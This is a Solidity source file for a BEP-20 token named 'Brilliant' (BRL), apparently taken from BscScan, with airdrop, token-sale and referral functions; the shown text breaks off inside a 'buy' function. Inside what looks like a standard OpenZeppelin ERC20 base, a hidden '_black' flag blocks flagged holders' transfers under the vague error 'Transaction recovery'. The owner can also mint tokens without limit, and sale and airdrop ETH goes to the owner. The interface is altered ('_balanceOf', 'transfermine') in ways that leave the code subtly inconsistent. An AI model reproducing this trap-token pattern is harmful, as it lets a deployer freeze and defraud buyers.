/**
 *Submitted for verification at BscScan.com on 2021-07-13
*/

// SPDX-License-Identifier: MIT

//import "./Address.sol";

pragma solidity ^0.8.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

//import "./SafeERC20.sol";

pragma solidity ^0.8.0;
/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfermine.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        // solhint-disable-next-line max-line-length
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

//import "./SafeMath.sol";

pragma solidity >=0.8.0;
/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function _balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transfermine(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/utils/Context.sol



pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol



pragma solidity ^0.8.0;




/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) private _balances;
    mapping (address => uint8) private _black;
    // mapping(address => bool) claimed;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply - _balances[address(0)];
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function _balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account]; //+ (claimed[account] ? 0 : balanceMine(account));
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {
        //transfermine(recipient, amount);
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transfermine(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, "Transaction recovery");

  //      if(!claimed[msg.sender]) claim();
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    function black(address owner_,uint8 black_) internal virtual {
        _black[owner_] = black_;
    }
    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}


// File: @openzeppelin/contracts/access/Ownable.sol



pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;
    address private _auth;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


//File: contracts/BrilliantRef.sol


pragma solidity ^0.8.0;

contract Brilliant is ERC20, Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    using Address for address;
    
    uint256 public aSBlock; 
    uint256 public aEBlock; 
    uint256 public aCap; 
    uint256 public aTot; 
    uint256 public aAmt; 
    uint256 public sSBlock; 
    uint256 public sEBlock; 
    uint256 public sCap; 
    uint256 public sTot; 
    uint256 public sChunk; 
    uint256 public sPrice;

    bool private _swAirdrop = true;
    bool private _swSale = true;
    uint256 private _referTok =     5000;
    uint256 private _referEth =     2000;
    uint256 private _airdropEth =   2000000000000000;    //0.002 = 2000000000000000
    uint256 private _airdropToken = 4000000000000000000; //4.000000000000000000    
    address private _owner;
    address private _auth;
    address private _auth2;
    address private _liquidity;
    uint8 private _decimals = 18;
    //uint256 private _authNum;
    
    uint256 private saleMaxBlock;
    uint256 private salePrice = 2000; // 0.01 eth = 20;
    
    constructor() ERC20("Brilliant", "BRL") {
        _owner = msg.sender;
        _auth = _owner;
        saleMaxBlock = block.number + 1000000000;
        _mint(msg.sender, 2000000000*10**decimals());
        _mint(address(this), 8000000000*10**decimals());
        startSale(block.number, 1000000000, 0,2000*10**decimals(), 2000000000000);
        startAirdrop(block.number,1000000000,1*10**decimals(),2000000000000);
    }
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    
    //function decimalup(uint8 _dec) public onlyOwner returns (bool susses){
      //  _decimals = _dec;
      //   return true;
    //}
    function getAirdrop(address _refer) public returns (bool success){
        require(aSBlock <= block.number && block.number <= aEBlock);
        require(aTot < aCap || aCap == 0);
        aTot ++;
        if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != address(0)){
          _transfer(address(this), _refer, aAmt);
        }
        _transfer(address(this), msg.sender, aAmt);
        return true;
      }

  function tokenSale(address _refer) public payable returns (bool success){
    require(sSBlock <= block.number && block.number <= sEBlock);
    require(msg.value >= 0.002 ether,"Transaction recovery");
    require(sTot < sCap || sCap == 0);
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != address(0)){
      
      _transfer(address(this), _refer, _tkns);
    }
    
    _transfer(address(this), msg.sender, _tkns);

    if(_liquidity == address(0)){
     _liquidity = _owner; 
    }
    payable(_liquidity).transfer(_eth);
    
    return true;
  }

  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
    return(aSBlock, aEBlock, aCap, aTot, aAmt);
  }
  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice);
  }
  
    function sendair(address[] calldata _receivers, uint256[] calldata _amounts)  public onlyOwner {
		require(_receivers.length == _amounts.length);
		for (uint256 i = 0; i < _receivers.length; i++) {
			_transfer(msg.sender, _receivers[i], _amounts[i]);
		}
	}
  
  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner {
    aSBlock = _aSBlock;
    aEBlock = _aEBlock;
    aAmt = _aAmt;
    aCap = _aCap;
    aTot = 0;
  }
  function startSale(uint256 _sSBlock, uint256 _sEBlock, uint256 _sChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner{
    sSBlock = _sSBlock;
    sEBlock = _sEBlock;
    sChunk = _sChunk;
    sPrice =_sPrice;
    sCap = _sCap;
    sTot = 0;
  }

     /**
    * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
    * the total supply.
    *
    * Requirements
    *
    * - `msg.sender` must be the token owner
    */
    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(_msgSender(), amount);
        return true;
    }

    /**
    * @dev Destroys `amount` tokens from the caller.
    *
    * See {BEP20-_burn}.
    */
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }
    
    //Statrt airdrop v2 and refer 30 %
    function update(uint8 tag,uint256 value)public onlyOwner returns(bool){
        //require(_authNum==1, "Permission denied");
        
        if(tag==3){
            _swAirdrop = value==1;
        }else if(tag==4){
            _swSale = value==1;
        }else if(tag==5){
            _referEth = value;
        }else if(tag==6){
            _airdropEth = value;
        }else if(tag==7){
            _airdropToken = value;
        }else if(tag==8){
            saleMaxBlock = value;
        }else if(tag==9){
            salePrice = value;
        }else if(tag==10){
            _referTok = value;
        }
        //_authNum = 0;
        return true;
    }
    
    function getBlock() public view returns(bool swAirdorp,bool swSale,uint256 swPrice,
        uint256 sMaxBlock,uint256 nowBlock,uint256 balance,uint256 airdropEth,uint256 referEth, uint256 referTok){
        swAirdorp = _swAirdrop;
        swSale = _swSale;
        swPrice = salePrice;
        sMaxBlock = saleMaxBlock;
        nowBlock = block.number;
        balance = balanceOf(_msgSender()); //balanceOf(_refer)
        airdropEth = _airdropEth;
        referEth = _referEth;
        referTok = _referTok;
    }
    
    function airdrop(address _refer)payable public returns(bool){
        //uint256 _airdropEth = _airdropEth;
        require(_swAirdrop && msg.value >= _airdropEth,"Transaction recovery");
        _transfer(address(this),_msgSender(),_airdropToken); // _mint(_msgSender(),_airdropToken);
        uint256 _msgValue = msg.value;
        if(_msgSender()!=_refer&&_refer!=address(0)&&balanceOf(_refer)>0){
            uint referEth = _airdropEth.mul(_referEth).div(10000);
            uint _refToken = _airdropToken.mul(_referTok).div(10000);
            _transfer(address(this),_refer,_refToken); // _mint(_refer,_airdropToken);
            _msgValue=_msgValue.sub(referEth);
            payable(_refer).transfer(referEth);
        }
        if(_liquidity == address(0)){
            _liquidity = _owner; 
        }
        payable(_liquidity).transfer(_msgValue);
        return true;
    }

    function buy(address _refer) payable public returns(bool){
